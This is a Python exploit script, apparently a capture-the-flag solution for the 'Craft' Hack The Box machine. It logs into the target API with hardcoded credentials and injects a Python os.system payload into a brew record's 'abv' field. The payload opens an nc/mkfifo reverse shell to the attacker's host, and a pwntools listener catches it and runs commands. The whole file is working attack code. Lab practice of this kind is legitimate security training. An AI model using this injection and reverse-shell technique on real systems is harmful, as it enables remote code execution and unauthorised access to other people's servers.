#!/usr/bin/env python

import json
import requests
import sys
import urllib3
from pwn import *

urllib3.disable_warnings()

def main():
    
    try:
        lhost = sys.argv[1]
        lport = sys.argv[2]
    except:
        print(" [*] Enter the LHOST and LPORT")
        sys.exit(1)
        
    response = requests.get('https://api.craft.htb/api/auth/login', 
                            auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
    token =  json.loads(response.text)['token']

    headers = {'X-Craft-API-Token': token, 'Content-Type': 'application/json'}
    
    rev_payload = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f')#".format(lhost, lport)
    brew_dict = {}
    brew_dict['abv'] = rev_payload
    brew_dict['name'] = 'bullshit'
    brew_dict['brewer'] = 'bullshit'
    brew_dict['style'] = 'bullshit'

    json_data = json.dumps(brew_dict)
    l = listen(lport)
    
    try:
        response = requests.post('https://api.craft.htb/api/brew/', headers=headers, 
                                                                    data=json_data, 
                                                                    verify=False, 
                                                                    timeout=1)
    except:
        l.sendline("""uname -a && id""")
        l.interactive()
        

if __name__ == "__main__":
    
    print(" [*] Dinesh test.py modified by nullarmor")
    print(" [*] usage: exploit.py LHOST LPORT")
    main()
